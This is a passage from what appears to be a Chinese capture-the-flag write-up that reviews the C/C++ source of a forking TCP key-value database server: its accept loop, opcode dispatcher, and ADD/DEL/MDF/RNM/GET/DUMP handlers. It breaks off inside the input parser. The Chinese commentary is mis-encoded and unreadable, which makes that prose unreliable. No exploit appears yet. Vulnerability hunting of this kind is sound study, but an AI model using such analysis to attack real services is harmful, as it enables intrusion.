((client_fd = accept(sock_fd, (struct sockaddr*)&amp;client_addr,</span><br><span class="line">                                &amp;client_addr_len)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): accept()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* get address info */</span></span><br><span class="line">            <span class="keyword">char</span> ip_str[INET_ADDRSTRLEN+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">            uint16 port;</span><br><span class="line">            inet_ntop(AF_INET, &amp;client_addr.sin_addr.s_addr, ip_str, <span class="keyword">sizeof</span>(ip_str));</span><br><span class="line">            port = ntohs(client_addr.sin_port);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* set TCP_NODELAY */</span></span><br><span class="line">            new_optval = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (setsockopt(client_fd, SOL_TCP, TCP_NODELAY, &amp;new_optval,</span><br><span class="line">                           <span class="keyword">sizeof</span>(new_optval)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                        <span class="string">&quot;Warnning: Can not setsockopt() for client_fd %d&quot;</span>,</span><br><span class="line">                        client_fd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* fork process */</span></span><br><span class="line">            <span class="keyword">int</span> pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// subprocess</span></span><br><span class="line">                    close(sock_fd);</span><br><span class="line">                    <span class="comment">/* set timeout */</span></span><br><span class="line">                    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">                        alarm(timeout);</span><br><span class="line">                        signal(SIGALRM, signal_handler);</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[%d] Connection Established - %s:%d\n&quot;</span>, getpid(), ip_str, port);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* handle */</span></span><br><span class="line">                    <span class="keyword">int</span> res = handle_request(client_fd);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* normal exit */</span></span><br><span class="line">                    close_socket(client_fd);</span><br><span class="line">                    <span class="built_in">exit</span>(res);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// main process </span></span><br><span class="line">                    close(client_fd);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end loop */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­è¿›ç¨‹è°ƒç”¨<code>handle_request(fd)</code>å‡½æ•°å¤„ç†è¯·æ±‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">handle_request</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_buf[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> op_buf[MAX_OP_SIZE + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    uint16 op_len_be = <span class="number">0</span>;</span><br><span class="line">    uint16 op_len_le = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    FETCH_COMMAND:</span><br><span class="line">        <span class="comment">/* check MAGIC */</span></span><br><span class="line">        <span class="built_in">memset</span>(magic_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(magic_buf));</span><br><span class="line">        <span class="built_in">memset</span>(op_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(op_buf));</span><br><span class="line">        <span class="keyword">if</span> (readn(sock, magic_buf, MAGIC_SIZE) != MAGIC_SIZE) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Magic&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(magic_buf, MAGIC, MAGIC_SIZE)) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Magic&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read op */</span></span><br><span class="line">        <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;op_len_be, <span class="keyword">sizeof</span>(uint16)) != <span class="keyword">sizeof</span>(uint16)) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Op Length&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        op_len_le = BigLittleSwap16(op_len_be);</span><br><span class="line">        <span class="keyword">if</span> (op_len_le &gt; MAX_OP_SIZE) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Op Length&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(op_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(op_buf));</span><br><span class="line">        readn(sock, op_buf, op_len_le);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* find handler */</span></span><br><span class="line">        op_handler* h = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (h = &amp;accepted_ops[<span class="number">0</span>]; h-&gt;opcode[<span class="number">0</span>] &amp;&amp; h-&gt;handler; h++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(op_buf, h-&gt;opcode, op_len_le)) &#123;</span><br><span class="line">                <span class="comment">/* call handler */</span></span><br><span class="line">                <span class="keyword">int</span> res = h-&gt;handler(sock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] op_handler_%s() return %d\n&quot;</span>, getpid(),</span><br><span class="line">                        h-&gt;opcode, res);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                <span class="keyword">goto</span> FETCH_COMMAND;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* unknown opcode return */</span></span><br><span class="line">        resp_str(sock, <span class="string">&quot;Op Not Found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆç»è¿‡ä¸€äº›æ£€æŸ¥ï¼Œç„¶åæ ¹æ®æŠ¥æ–‡é‡Œçš„å†…å®¹è°ƒç”¨å¯¹åº”å‡½æ•°ï¼Œå¯é€‰é¡¹ä¸€å…±æœ‰è¿™äº›</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">op_buf=&#123;</span><br><span class="line">    <span class="number">1</span>:<span class="string">b&quot;ADD&quot;</span>, <span class="number">2</span>:<span class="string">b&quot;DEL&quot;</span>,<span class="number">3</span>:<span class="string">b&quot;MDF&quot;</span>,<span class="number">4</span>:<span class="string">b&quot;RNM&quot;</span>,</span><br><span class="line">    <span class="number">5</span>:<span class="string">b&quot;CPY&quot;</span>,<span class="number">6</span>:<span class="string">b&quot;GET&quot;</span>,<span class="number">7</span>:<span class="string">b&quot;DUM&quot;</span>,<span class="number">8</span>:<span class="string">b&quot;CLR&quot;</span>,</span><br><span class="line">    <span class="number">9</span>:<span class="string">b&quot;SHU&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿™äº›é€‰é¡¹å¯¹åº”çš„å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">op_handler</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> opcode[MAX_OP_SIZE + <span class="number">1</span>];</span><br><span class="line">    uint32 (*handler)(<span class="keyword">int</span>);</span><br><span class="line">&#125; accepted_ops[] = &#123;</span><br><span class="line">    &#123;OPCODE_ADD, op_handler_ADD&#125;,       &#123;OPCODE_DELETE, op_handler_DEL&#125;,</span><br><span class="line">    &#123;OPCODE_MODIFY, op_handler_MDF&#125;,    &#123;OPCODE_RENAME, op_handler_RNM&#125;,</span><br><span class="line">    &#123;OPCODE_COPY, op_handler_CPY&#125;,      &#123;OPCODE_GET, op_handler_GET&#125;,</span><br><span class="line">    &#123;OPCODE_SHUTDOWN, op_handler_SHUT&#125;, &#123;OPCODE_DUMP, op_handler_DUMP&#125;,</span><br><span class="line">    &#123;OPCODE_CLEAR, op_handler_CLR&#125;,     &#123;OPCODE_TREM, <span class="literal">NULL</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ¯”è¾ƒå…³é”®çš„å°±æ˜¯<code>op_handler_ADD()</code>,<code>op_handler_DEL</code>,<code>op_handler_RNM</code>,<code>op_handler_MDF</code>,<code>op_handler_GET</code>,<code>op_handler_DUMP</code>è¿™å‡ ä¸ªå‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">op_handler_ADD</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* value = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!value) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Value Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">add_data_item</span>(key, value, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Add Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_DEL</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">delete_data_item</span>(key) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Delete Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹value</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_MDF</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* new_value = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!new_value) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Value Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">modify_data_item</span>(key, new_value) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Modify Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(new_value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹key</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_RNM</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Old Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* new_key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!new_key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;New Key Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* check dup */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">get_data_item</span>(new_key) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Duplicate Key&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rename_data_item</span>(key, new_key) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Rename Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ ¹æ®keyå¾—åˆ°valueçš„æ•°æ®</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_GET</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* res = <span class="built_in">get_data_item</span>(key);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* return an empty type data_t */</span></span><br><span class="line">        <span class="keyword">data_t</span>* empty = (<span class="keyword">data_t</span>*)<span class="built_in">calloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (empty) &#123;</span><br><span class="line">            empty-&gt;type = DATA_TYPE_EMPTY;</span><br><span class="line">            <span class="built_in">do_resp</span>(sock, empty);</span><br><span class="line">            <span class="built_in">release_data_t</span>(empty);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Get Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">do_resp</span>(sock, res);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¾—åˆ°æ•´ä¸ªæ•°æ®åº“çš„å†…å®¹</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_DUMP</span><span class="params">(<span class="keyword">int</span> sock)</span></span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span> *dump_array = <span class="built_in">dump_data_item</span>();</span><br><span class="line">    <span class="keyword">if</span>(!dump_array)&#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Dump Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">do_resp</span>(sock, dump_array);</span><br><span class="line">    <span class="built_in">release_data_t</span>(dump_array);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­addå‡½æ•°æ˜¯æ¥æ”¶ä¸€ä¸ªkeyå’Œvalueç„¶åæ”¾å…¥databaseä¸­ï¼Œdelå‡½æ•°å°±æ˜¯æ ¹æ®keyåˆ é™¤ä¸€å¯¹é”®å€¼å¯¹ï¼Œgetå°±æ˜¯æ ¹æ®keyå‘ç”¨æˆ·å‘é€å¯¹åº”çš„value,rnmå°±æ˜¯é‡å†™ä¸€ä¸ªkey,mdfå°±æ˜¯æ ¹æ®ä¸€ä¸ªkeyé‡å†™ä¸€ä¸ªvalueï¼Œdumpå°±æ˜¯æŠŠæ•°æ®åº“é‡Œçš„æ‰€æœ‰æ•°æ®å…¨éƒ½å‘é€ç»™ç”¨æˆ·</p>
<p>å¤„ç†ç”¨æˆ·è¾“å…¥çš„å‡½æ•°å¦‚ä¸‹,å°±æ˜¯æ ¹æ®ä¸åŒçš„typeåˆ›å»ºä¸åŒçš„<code>data_t</code>ï¼Œå®¡å®Œå‘ç°éå¸¸å®‰å…¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">data_t</span>* <span class="title">read_data_t</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">do_read_data_t</span>(sock, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">data_t</span>* <span class="title">do_read_data_t</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    uint16 type_be;</span><br><span class="line">    uint16 type_le;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new data_t obj */</span></span><br><span class="line">    <span class="keyword">data_t</span>* tmp = (<span class="keyword">data_t</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">data_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (!tmp)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// integer</span></span><br><span class="line">    <span class="keyword">data_integer_t</span> integer_be = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// float</span></span><br><span class="line">    <span class="keyword">data_float_t</span> float_be = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// string</span></span><br><span class="line">    uint32 str_len_be = <span class="number">0</span>;</span><br><span class="line">    uint32 str_len_le = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// array</span></span><br><span class="line">    